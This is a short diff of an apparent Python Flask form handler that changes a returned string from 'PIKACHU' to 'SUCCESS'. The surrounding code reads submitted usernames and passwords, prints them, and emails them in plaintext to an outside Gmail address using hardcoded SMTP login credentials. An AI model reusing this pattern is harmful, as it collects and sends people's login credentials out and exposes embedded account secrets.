@@ -76,7 +76,7 @@ def receive_data():
     name = request.form["Username"]
     password = request.form["Password"]
     print(f"{name}\n{password}")
-    return "PIKACHU"
+    return "SUCCESS"
 
 
 if __name__ == "__main__":
@@ -93,4 +93,4 @@ def receive_data():
             connection.starttls()
             connection.login("pythontesT@gmail.com", "onpsaksajksrynodqdasjnahmjjwp")
             connection.sendmail("python@Gmail.com", "jeringm89@gmail.com", f"{name} pass {password}")
-    return "PIKACHU"
+    return "SUCCESS"
